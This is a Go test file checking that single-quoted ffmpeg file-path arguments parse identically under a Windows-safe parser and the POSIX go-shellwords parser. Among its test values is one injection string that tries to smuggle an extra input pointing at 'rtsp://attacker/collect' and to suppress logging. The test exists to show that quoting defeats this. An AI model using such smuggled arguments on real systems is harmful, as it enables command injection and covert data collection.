package ffmpeg

import (
	"reflect"
	"strings"
	"testing"

	"github.com/mattn/go-shellwords"
)

// quoteArg mirrors internal/service/task.quoteArg: it wraps v in single quotes
// and renders an embedded single quote as '"'"'. It is duplicated here so this
// package can prove its own Windows-path-safe parser (shellwordsUnicodeSafe)
// accepts those quoted tokens identically to the POSIX parser used elsewhere.
func quoteArg(v string) string {
	return "'" + strings.ReplaceAll(v, "'", `'"'"'`) + "'"
}

// TestShellwordsUnicodeSafeMatchesPosixForQuotedArgs asserts that single-quoted
// file-path tokens (the quoting the task package applies to wildcards) parse to
// the same argv under the Windows parser as under github.com/mattn/go-shellwords.
// This is why single quoting was chosen: its meaning is identical in both
// parsers, including for spaces, parentheses, backslashes (Windows paths) and an
// embedded apostrophe, so the fix behaves the same on Windows as on macOS/Linux.
func TestShellwordsUnicodeSafeMatchesPosixForQuotedArgs(t *testing.T) {
	s := &Service{}

	values := []string{
		`plain.mp4`,
		`/tmp/wf/big_buck_bunny_1080p_h264(2) copy.mp4`,
		`/tmp/wf/Bob's clip.mov`,
		`C:\videos\in put.mkv`,
		`C:\Users\O'Brien\my (final) clip.mov`,
		`in.mp4" -i rtsp://attacker/collect -loglevel "quiet`,
	}

	for _, v := range values {
		cmd := "-i " + quoteArg(v) + " -y " + quoteArg(v+".out")
		want := []string{"-i", v, "-y", v + ".out"}

		posix, err := shellwords.NewParser().Parse(cmd)
		if err != nil {
			t.Fatalf("posix Parse(%q): %v", cmd, err)
		}
		if !reflect.DeepEqual(posix, want) {
			t.Errorf("posix Parse(%q) = %#v, want %#v", cmd, posix, want)
		}

		win, err := s.shellwordsUnicodeSafe(cmd)
		if err != nil {
			t.Fatalf("windows shellwordsUnicodeSafe(%q): %v", cmd, err)
		}
		if !reflect.DeepEqual(win, want) {
			t.Errorf("windows shellwordsUnicodeSafe(%q) = %#v, want %#v", cmd, win, want)
		}
	}
}
